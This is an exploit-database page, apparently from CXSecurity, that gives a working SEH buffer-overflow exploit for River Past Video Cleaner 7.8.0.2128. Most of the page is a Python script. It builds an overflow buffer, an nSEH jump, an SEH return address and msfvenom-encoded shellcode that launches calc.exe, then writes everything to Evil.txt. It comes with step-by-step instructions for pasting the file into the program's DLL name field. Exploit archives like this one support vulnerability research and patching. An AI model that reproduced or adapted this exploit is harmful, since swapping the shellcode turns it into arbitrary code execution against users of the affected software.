---
title: River_Past_Video_Cleaner - Buffer Overflow (SEH)
url: https://cxsecurity.com/issue/WLB-2026010004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-01-07
fetch_date: 2026-01-08T03:29:10.339217
---

# River_Past_Video_Cleaner - Buffer Overflow (SEH)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **River\_Past\_Video\_Cleaner - Buffer Overflow (SEH)** **2026.01.07**  Credit:  **[Achilles](https://cxsecurity.com/author/Achilles/1/)**  Risk: **High**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: River\_Past\_Video\_Cleaner - Buffer Overflow (SEH)
# Date: 27.12.2025
# Software Link :https://river-past-video-cleaner-pro.software.informer.com/download/?ca79c7
# Exploit Author: Achilles
# Tested Version: 7.8.0.2128
# Tested on: Windows 11 64bit
# 1.- Run python code : River\_Past\_Video\_Clean.py
# 2.- Open EVIL.txt and copy All content to Clipboard
# 3.- Open VideoCleaner.exe and click on the 'Options' inside fhe 'File' menu
# 4.- Paste the Content of EVIL.txt into the 'Lame\_enc.dll' name field.
# 5.- Click 'OK'
# 6.- Calculator Start
# 7.- Greetings go:XiDreamzzXi,Metatron
#!/usr/bin/env python
import struct
buffer = "\x41" \* 280
nseh = "\xeb\x06\x90\x90" #jmp short 6
seh = struct.pack('<L',0x100111aa) #pop edi pop esiret 0x04 rvddshow2.dll
nops = "\x90" \* 20
#msfvenom -p windows/exec CMD=calc.exe -f py -e x86/alpha\_mixed EXITFUNC=seh -b "\x00\x0a\x0d\x2f" -i 1 -f python
shellcode = ("\x89\xe6\xd9\xee\xd9\x76\xf4\x5d\x55\x59\x49\x49"
"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
"\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x69\x6c\x6d\x38\x6b\x32\x33\x30\x77\x70\x65\x50"
"\x33\x50\x4b\x39\x78\x65\x50\x31\x39\x50\x52\x44"
"\x4c\x4b\x70\x50\x44\x70\x6c\x4b\x42\x72\x34\x4c"
"\x6e\x6b\x31\x42\x64\x54\x6e\x6b\x73\x42\x67\x58"
"\x36\x6f\x4f\x47\x73\x7a\x77\x56\x34\x71\x39\x6f"
"\x4e\x4c\x35\x6c\x63\x51\x61\x6c\x55\x52\x44\x6c"
"\x47\x50\x39\x51\x48\x4f\x64\x4d\x53\x31\x4a\x67"
"\x78\x62\x79\x62\x36\x32\x71\x47\x4e\x6b\x52\x72"
"\x56\x70\x6c\x4b\x63\x7a\x55\x6c\x4e\x6b\x42\x6c"
"\x66\x71\x44\x38\x39\x73\x33\x78\x53\x31\x6e\x31"
"\x56\x31\x6e\x6b\x32\x79\x77\x50\x65\x51\x69\x43"
"\x6e\x6b\x51\x59\x45\x48\x49\x73\x45\x6a\x37\x39"
"\x4c\x4b\x64\x74\x6c\x4b\x33\x31\x5a\x76\x46\x51"
"\x59\x6f\x6e\x4c\x69\x51\x68\x4f\x36\x6d\x65\x51"
"\x7a\x67\x35\x68\x69\x70\x51\x65\x4a\x56\x36\x63"
"\x31\x6d\x39\x68\x45\x6b\x61\x6d\x66\x44\x62\x55"
"\x6a\x44\x31\x48\x4c\x4b\x56\x38\x46\x44\x37\x71"
"\x68\x53\x71\x76\x4c\x4b\x54\x4c\x62\x6b\x6c\x4b"
"\x33\x68\x77\x6c\x76\x61\x4e\x33\x6c\x4b\x76\x64"
"\x4e\x6b\x43\x31\x6e\x30\x6d\x59\x50\x44\x36\x44"
"\x65\x74\x33\x6b\x71\x4b\x45\x31\x73\x69\x73\x6a"
"\x52\x71\x69\x6f\x59\x70\x73\x6f\x63\x6f\x71\x4a"
"\x4c\x4b\x57\x62\x48\x6b\x6c\x4d\x71\x4d\x33\x5a"
"\x63\x31\x4e\x6d\x4f\x75\x6e\x52\x55\x50\x77\x70"
"\x75\x50\x32\x70\x32\x48\x36\x51\x6c\x4b\x32\x4f"
"\x6f\x77\x59\x6f\x79\x45\x6f\x4b\x4b\x4e\x36\x6e"
"\x30\x32\x7a\x4a\x43\x58\x6d\x76\x6a\x35\x4f\x4d"
"\x4d\x4d\x79\x6f\x78\x55\x65\x6c\x63\x36\x63\x4c"
"\x37\x7a\x4d\x50\x6b\x4b\x69\x70\x73\x45\x73\x35"
"\x4f\x4b\x32\x67\x76\x73\x73\x42\x70\x6f\x52\x4a"
"\x43\x30\x56\x33\x49\x6f\x7a\x75\x72\x43\x55\x31"
"\x50\x6c\x30\x63\x66\x4e\x43\x55\x50\x78\x53\x55"
"\x45\x50\x41\x41")
payload = buffer + nseh + seh + nops + shellcode
try:
f=open("Evil.txt","w")
print "[+] Creating %s bytes evil payload.." %len(payload)
f.write(payload)
f.close()
print "[+] File created!"
except:
print "File cannot be created"

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026010004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top